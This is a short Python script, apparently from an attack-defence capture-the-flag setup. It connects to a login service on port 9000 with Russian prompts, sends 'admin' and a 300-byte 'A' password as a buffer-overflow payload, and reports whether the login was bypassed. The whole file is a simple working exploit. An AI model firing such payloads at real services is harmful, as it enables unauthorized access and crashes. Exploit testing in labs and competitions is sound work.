import asyncio
from colorama import Fore, Style


async def check_buffer_overflow(ip, port):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=5)
        await reader.readuntil("Введите имя пользователя: ".encode('utf-8'))
        writer.write("admin\n".encode('utf-8'))
        await writer.drain()

        await reader.readuntil("Введите пароль: ".encode('utf-8'))
        overflow_payload = "A" * 300
        writer.write((overflow_payload + "\n").encode('utf-8'))
        await writer.drain()

        response = await reader.read(1024)
        response_text = response.decode('utf-8').strip()

        if "Неверное имя пользователя или пароль" in response_text:
            print(Fore.RED + f"[-] Sploit 1 (Nuclear): {ip}:{port} - overflow sploit response failed" + Style.RESET_ALL)
            result = 102, None
        else:
            print(Fore.GREEN + f"[+] Sploit 1 (Nuclear): {ip}:{port} - overflow sploit response successfull" + Style.RESET_ALL)
            result = 101, None

        writer.close()
        await writer.wait_closed()
        return result
    except:
        print(Fore.RED + f"[-] Sploit 1 (Nuclear): {ip}:{port} - overflow sploit response failed" + Style.RESET_ALL)
        return 110, None


async def pwn(HOST):
    VERDICT = await check_buffer_overflow(HOST, 9000)
    print(VERDICT)
    return VERDICT


loop = asyncio.get_event_loop()
loop.run_until_complete(pwn('localhost'))
